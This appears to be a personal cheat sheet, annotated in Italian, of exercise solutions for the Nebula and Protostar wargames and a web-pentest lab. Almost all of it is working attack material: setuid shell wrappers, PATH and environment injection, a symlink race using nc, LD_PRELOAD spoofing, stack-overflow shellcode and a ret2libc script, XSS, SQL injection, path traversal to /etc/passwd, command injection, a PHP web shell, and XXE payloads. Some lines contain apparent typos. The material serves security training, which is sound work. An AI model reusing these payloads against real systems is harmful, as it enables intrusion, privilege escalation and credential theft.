# Nebula

## ShellMiniCode

```c
#include <unistd.h>
#include <stdlib.h>
int main(){
	gid_t g = getegid();
	uid_t u = geteuid();
	setresgid(g,g,g);
	setresuid(u,u,u);
	system("/bin/bash");
}
```

## Flag00 (FIND)

```bash
find / -user flag00 -perm -4000 2> /dev/nullcd 
# perm -4000  → **Match inclusivo**: i file devono avere **almeno** il bit `4000` impostato (altri bit sono accettati)
# perm 4000 → **Match esatto**: i file devono avere **solo** il bit `4000` (setuid) **e nessun altro permesso**
```

---

## Flag01 (PATH)

```bash
echo "/bin/sh" > /tmp/echo
chmod 777 /tmp/echo
export PATH=/tmp:$PATH
./flag01
```

---

## Flag02 (USER)

```bash
export USER="; /bin/bash #"
./flag02
```

---

## Flag03 (CRONTAB)

```bash
# scrivo shell.c in /tmp
# in writable.d creo run.sh:
	gcc -o /home/flag03/level03 /tmp/shell.c
	# deve essere per forza in /home/flag03
	chmod 4777 /home/flag/03/level03
# dopo 2 min nella shell:
./shell
```

---

## Flag04 (TOKEN)

```bash
ln -s /home/flag04/token /tmp/link04
./flag04 /tmp/link04
# il file token contiene la password per loggare come flag04
su flag04
```

---

## Flag05 (BACKUP-SSH)

```bash
cd /home/flag05
ll
# .backup contiene file tar riservato
cd .backup
cp backup-19072011.tgz /tmp
# estrarre
tar -zxvf backup-19072011.tgz
# la cartella nascosta .ssh contiene le chiavi
cd .ssh
ssh -i .ssh/id_rsa flag05@127.0.0.1
```

---

## Flag06 (HASH)

```bash
cat /etc/passwd | grep flag06
https://hashes.com/en/decrypt/hash
su level06
```

---

## Flag07 (HOST)

```bash
ss -tuln
cat /home/flag07/thttpd.conf | port
# è una O non uno zero
wget -qO- 'http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag'
# se non va, spostarsi prima in /tmp
# se non va
wget -qO- "http://192.168.1.224:7007/index.cgi?Host=127.0.0.1+%3b+/bin/getflag"
```

---

## Flag08 (PCAP)

```bash
tcpflow -C -r /home/flag08/capture.pcap | less
# . = canc
# backd00Rmate
su flag08
```

---

## Flag09 (EMAIL)

```bash
# soluzione 1
./flag09 -h
home/flag09/flag09 -r "system('/bin/sh');"
# soluzione 2
# creare file mail in /tmp con:
	[email {${system($use_me)}}]
./flag09 /tmp/mail /bin/sh
```

---

## Flag10 (TMUX)

```bash
# usare tmux
# nel primo pannello
nc -vlnk 18211 > /tmp/out
# nel secondo pannello (attezione agli spazi)
touch /tmp/faketoken
while :; do ln -fs /tmp/faketoken /tmp/link10 ; ln -fs /home/flag10/token /tmp/link10 ; done
#nel terzo pannello (attezione agli spazi)
while :; do ./flag10 /tmp/link10 127.0.0.1 ; done
```

---

## Level13 (LD_PRELOAD )

```bash
# scrivere il seguente codice nel file getuid.c in /tmp:
 #include <unistd.h>
 #include <sys/types.h>
 uid_t getuid(void) {
	 return 1000;
 }
# compilarlo con
gcc -shared -fPIC -o getuid.so getuid.c
# rimanendo in /tmp
export LD_PRELOAD=./getuid.so
# creare una copia di flag13 per togliere suid ed evitare errore
cp /home/flag13/flag13 /tmp
./level13
# usare la password per loggare come flag13
su flag13
```

---

# Protostar

## Stack0 (SOVRASCRIVERE VARIABILE)

```bash
python -c "print('A' * 68)" | ./stack0
```

---

## Stack1 (MODIFICARE VALORE)

```bash
./stack1 $(python -c "print('A'*64+b'\x64\x63\x62\x61')")
```

---

## Stack3 (MODIFICA FLUSSO)

```bash
python -c "print('A'*64+b'\x24\x84\x04\x08')" | ./stack3
```

---

## Stack4 (MODIFICA RETURN)

```bash
python -c "print('A'*76+b'\xf4\x83\x04\x08')" | ./stack4
```

---

## Stack5 (NON VA)

```bash

```

---

## Stack6 (LEAK)

```bash
echo `python -c 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x90"*25 + "\xbf\x84\x04\x08")'` | /opt/protostar/bin/stack7
# oppure in a.py
import struct
padding = 'AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV'
call_system = struct.pack("I", 0xb7ecffb0)
ret_of_system = 'AAAA'
bin_sh = struct.pack("I", 0xb7fb63bf)
print padding + call_system + ret_of_system + bin_sh
# poi 
(python /tmp/a.py; cat) | opt/protostar/bin/stack6
```

# Pentester

## XSS

### 1

```bash
?name=<script>alert(1)</script>
```

---

### 2

```bash
?name=<sCRIPT>alert(1)</sCRIPT>
# usare uppercase, refresh browser history
```

---

### 3

```jsx
?name=<scr<script>ipt>alert(1)</scr</script>ipt>
```

---

### 4

```jsx
?name=<body%20onload="alert(1)">
```

---

### 5

```jsx
?name=<script>prompt(1)</script>
```

---

### 6

```jsx
?name=";alert(1);//
```

---

### 7

```jsx
?name=';alert(1);//
```

---

### 8

```jsx
/"><script>alert(1)</script>
# no ? add after .php
```

---

### 9

```jsx
dom based
```

## SQLI

### 1

```bash
?name='OR'1'='1
```

---

### 2

```bash
?name=root'or'1'='1
```

---

### 3

```jsx
?name=root'or'1'='1
```

---

### 4

```jsx
?id=2 or 1=1
```

---

### 5

```jsx
?id=2 or 1=1
```

---

### 6

```jsx
?id=1 or 1=1 %25 123
```

---

### 7

```jsx
?id=2%0Aor 1=1
```

---

### 8

```jsx
?order=name`DESC%23
# attenzione è una backtick
```

---

### 9

```jsx
?order=IF(0,name,age)
```

---

## Directory Traversal

### 1

```jsx
wget -O - 'http://127.0.0.1/dirtrav/example1.php?file=../../../../../../../etc/passwd'
```

---

### 2

```jsx
wget -O - 'http://127.0.0.1/dirtrav/example2.php?file=/var/www/files/../../../../etc/passwd'
```

---

### 3

```jsx
wget -O - 'http://127.0.0.1/dirtrav/example3.php?file=../../../../etc/passwd%00.png'
```

---

## File Include

### 1

```jsx
?page=../../../../../../../../etc/passwd
```

### 2

```jsx
?page=../../../../etc/passwd%00
```

## Code Injection

### 1

```bash
?name=hacker";%20system("ls");//
```

### 2

```bash
?order=id);}system(%22ls22);//
```

### 3

```bash
?new=system("cat%20/etc/passwd")&pattern=/lamer/e&base=Hello%20lamer
```

### 4

```bash
?name=hacker%27.system(%22cat%20/etc/passwd%22).%27
```

## Command Injection

### 1

```jsx
?ip=%20;%20cat%20/etc/passwd
```

---

### 2

```jsx
?ip=127.0.0.1%0acat%20/etc/passwd
```

---

### 3

```jsx

echo -e "GET http://127.0.0.1/commandexec/example3.php?ip=127.0.0.1|uname+-a HTTP/1.0\r\n" | nc 127.0.0.1 80
# forse non va
```

---

## LDAP

### 1

```bash
?
```

### 2

```bash
?name=a*)(cn=*))%00 -> per autenticarsi come admin
?name=hacker)(cn=*))%00 -> per autenticarsi come hacker
```

## File Upload

### 1

```bash
# creo e upload file a.php con:
<?php
  system($_GET["cmd"]);
?>
# nella pagina .../a.php aperta cliccando su "here" aggiungo:
?cmd=ls
```

### 2

```jsx
uguale ma il file va salvato come .php4
```

## XML

### 1

```lua
?xml=%3C!DOCTYPE%20root%20[%3C!ENTITY%20hacker%20SYSTEM%20%22file:///etc/passwd%22%3E]%20%3E%3Croot%3E%26hacker%3b%3C/root%3E
?xml=<!DOCTYPE root [<!ENTITY hacker SYSTEM "file:///etc/passwd">] ><root>&hacker;</root>
```

### 2

```lua
?name=admin%27]/parent::*/password%00
```
